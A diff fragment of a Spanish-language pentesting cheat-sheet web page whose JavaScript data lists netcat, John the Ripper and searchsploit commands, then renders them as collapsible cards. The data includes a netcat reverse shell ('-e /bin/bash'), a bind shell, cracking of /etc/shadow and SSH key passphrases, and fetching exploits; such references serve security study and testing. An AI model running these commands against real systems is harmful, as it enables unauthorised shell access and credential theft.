+          { scenario: "Listener para reverse shell", command: "nc -lvnp 4444", explanation: "-l: listen | -v: verbose | -n: no DNS | -p: puerto" },
+          { scenario: "Transferir archivo", command: "# Receptor:\nnc -lvnp 4444 > file.txt\n# Emisor:\nnc 192.168.1.100 4444 < file.txt", explanation: "Envía archivos entre máquinas" },
+          { scenario: "Reverse shell (víctima)", command: "nc 192.168.1.50 4444 -e /bin/bash", explanation: "-e: ejecuta comando (bash shell)" },
+          { scenario: "Bind shell (atacante)", command: "nc 192.168.1.100 4444", explanation: "Conecta a bind shell en víctima" },
+          { scenario: "Escaneo de puertos simple", command: "nc -zv 192.168.1.100 1-1000", explanation: "-z: zero I/O mode | escanea puertos 1-1000" }
+        ]
+      },
+      johntheripper: {
+        title: "John the Ripper - Password Cracking",
+        colorClass: "c-reddark",
+        category: "Password Attack",
+        examples: [
+          { scenario: "Crackear hash básico", command: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt", explanation: "Usa wordlist para crackear hashes" },
+          { scenario: "Ver passwords crackeadas", command: "john --show hash.txt", explanation: "Muestra passwords ya descubiertas" },
+          { scenario: "Hash de /etc/shadow", command: "unshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn unshadowed.txt", explanation: "Combina passwd y shadow para crackear" },
+          { scenario: "SSH private key", command: "ssh2john id_rsa > ssh_hash.txt\njohn --wordlist=rockyou.txt ssh_hash.txt", explanation: "Convierte llave SSH y crackea passphrase" },
+          { scenario: "ZIP protegido", command: "zip2john file.zip > zip_hash.txt\njohn zip_hash.txt", explanation: "Extrae hash de ZIP y lo crackea" },
+          { scenario: "Formato específico", command: "john --format=NT hash.txt", explanation: "Especifica formato de hash (NT, MD5, SHA, etc)" }
+        ]
+      },
+      searchsploit: {
+        title: "Searchsploit - Exploit Database",
+        colorClass: "c-pink",
+        category: "Explotación",
+        examples: [
+          { scenario: "Buscar exploits por software", command: "searchsploit apache 2.4.49", explanation: "Busca exploits para Apache versión 2.4.49" },
+          { scenario: "Búsqueda exacta", command: "searchsploit -t vsftpd 2.3.4", explanation: "-t: búsqueda por título exacto" },
+          { scenario: "Ver código del exploit", command: "searchsploit -x 49584", explanation: "-x: examina/muestra el código del exploit" },
+          { scenario: "Copiar exploit al directorio", command: "searchsploit -m 49584", explanation: "-m: mirror/copia exploit al directorio actual" },
+          { scenario: "Buscar por plataforma", command: "searchsploit --platform windows kernel", explanation: "Filtra por sistema operativo" },
+          { scenario: "Actualizar base de datos", command: "searchsploit -u", explanation: "Actualiza la base de datos local de exploits" }
+        ]
+      }
+    };
+
+    // ======= Construir UI ========
+    const main = document.getElementById('main');
+
+    // categorizar
+    const categories = [...new Set(Object.values(tools).map(t => t.category))];
+
+    function createIcon(name){
+      // Iconos SVG simples (minimalistas)
+      const svgNS = 'http://www.w3.org/2000/svg';
+      const svg = document.createElementNS(svgNS,'svg');
+      svg.setAttribute('width','24');
+      svg.setAttribute('height','24');
+      svg.setAttribute('viewBox','0 0 24 24');
+      svg.setAttribute('aria-hidden','true');
+      const path = document.createElementNS(svgNS,'path');
+      path.setAttribute('fill','currentColor');
+      // simple shapes per name
+      const shapes = {
+        search: "M21 21l-4.35-4.35M10.5 18a7.5 7.5 0 1 1 0-15 7.5 7.5 0 0 1 0 15z",
+        globe: "M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20z",
+        lock: "M6 10V8a6 6 0 0 1 12 0v2h1a1 1 0 0 1 1 1v9a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-9a1 1 0 0 1 1-1h1z",
+        db: "M12 2C7.03 2 3 3.79 3 6v12c0 2.21 4.03 4 9 4s9-1.79 9-4V6c0-2.21-4.03-4-9-4z",
+        term: "M4 6h16M4 12h16M4 18h16",
+        shield: "M12 2l7 4v6c0 5-3.58 9.74-7 10-3.42-.26-7-5-7-10V6l7-4z",
+        server: "M3 5h18v6H3zM3 13h18v6H3z",
+        code: "M8.12 12.12 3 7l1.4-1.4L9.52 12 4.4 17.4 3 16z M15.88 12.12 20 7l-1.4-1.4L14.48 12l4.12 4.4L20 15z"
+      };
+      path.setAttribute('d', shapes[name] || shapes.search);
+      svg.appendChild(path);
+      return svg;
+    }
+
+    function build(){
+      categories.forEach(cat => {
+        const section = document.createElement('section');
+        section.className = 'category';
+        const h2 = document.createElement('h2');
+        h2.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" style="opacity:.9"><path d="M9 18l6-6-6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>' + cat;
+        section.appendChild(h2);
+
+        const toolKeys = Object.keys(tools).filter(k => tools[k].category === cat);
+        toolKeys.forEach(key => {
+          const data = tools[key];
+          const card = document.createElement('div');
+          card.className = 'tool-card';
+
+          // button
+          const btn = document.createElement('button');
+          btn.className = 'tool-btn ' + (data.colorClass || '');
+          btn.setAttribute('aria-expanded','false');
+          btn.setAttribute('type','button');
+
+          const left = document.createElement('div'); left.className='tool-left';
+          const iconWrap = document.createElement('div');
+          iconWrap.style.display='inline-flex';
+          iconWrap.style.alignItems='center';
+          iconWrap.style.justifyContent='center';
+          iconWrap.style.width='38px';
+          iconWrap.style.height='38px';
+          iconWrap.style.borderRadius='8px';
+          iconWrap.style.background='rgba(255,255,255,.06)';
+          iconWrap.style.flex='0 0 38px';
+          // choose icon by key heuristics
+          const iconName = key.includes('nmap')? 'search' : key.includes('gobuster')? 'globe' : key.includes('hydra')||key.includes('john')? 'lock' : key.includes('sqlmap')? 'db' : key.includes('metasploit')? 'shield' : key.includes('smb')? 'server' : key.includes('nikto')? 'globe' : key.includes('netcat')? 'term' : 'code';
+          iconWrap.appendChild(createIcon(iconName));
+          left.appendChild(iconWrap);
+
+          const meta = document.createElement('div'); meta.className='tool-meta';
+          const ttitle = document.createElement('div'); ttitle.className='tool-title'; ttitle.textContent = data.title;
+          const tcat = document.createElement('div'); tcat.className='tool-category'; tcat.textContent = data.category;
+          meta.appendChild(ttitle); meta.appendChild(tcat);
+          left.appendChild(meta);
+
+          const chev = document.createElement('div');
+          chev.className = 'chev';
+          chev.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M9 18l6-6-6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+
+          btn.appendChild(left);
+          btn.appendChild(chev);
+          card.appendChild(btn);
+
+          // examples container (hidden by default)
+          const exContainer = document.createElement('div');
+          exContainer.className = 'examples';
+          exContainer.style.display = 'none';
+
+          data.examples.forEach((ex, idx) => {
+            const exEl = document.createElement('div'); exEl.className = 'example';
+
+            const head = document.createElement('div'); head.className = 'ex-head';
+            const num = document.createElement('div'); num.className='ex-num'; num.textContent = idx+1;
+            const title = document.createElement('div'); title.className='ex-title'; title.textContent = ex.scenario;
+            head.appendChild(num); head.appendChild(title);
+
+            const cmd = document.createElement('pre');
+            cmd.className='cmd';
+            // format lines: prefix $ unless line starts with #
+            const lines = ex.command.split('\\n');
+            // build HTML content safely
+            cmd.innerHTML = lines.map(line => {
+              if(line.trim().startsWith('#')){
+                return '<div class="comment">'+escapeHtml(line)+'</div>';
+              } else {
+                return '<div><span class="prompt">$</span>' + escapeHtml(line) + '</div>';
+              }
+            }).join('');
+            const expl = document.createElement('div'); expl.className='ex-expl';
+            expl.innerHTML = '<span>💡</span><div>'+escapeHtml(ex.explanation)+'</div>';
+
+            exEl.appendChild(head);
+            exEl.appendChild(cmd);
+            exEl.appendChild(expl);
+            exContainer.appendChild(exEl);
+          });
+
+          // toggle logic
+          btn.addEventListener('click', () => {
+            const opened = exContainer.style.display !== 'none';
+            if(opened){
+              exContainer.style.display = 'none';
+              btn.setAttribute('aria-expanded','false');
+              chev.classList.remove('rot');
+            } else {
+              exContainer.style.display = 'grid';
+              btn.setAttribute('aria-expanded','true');
+              chev.classList.add('rot');
+              // scroll into view a bit for mobile
+              setTimeout(()=> { card.scrollIntoView({behavior:'smooth', block:'center'}); }, 120);
+            }
+          });
+
+          card.appendChild(exContainer);
+          section.appendChild(card);
+        });
+
+        main.appendChild(section);
+      });
+    }
+
+    // helper to escape HTML
+    function escapeHtml(s){
+      return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    }
+
+    // Start
+    build();
+
+  </script>
+</body>
+</html>
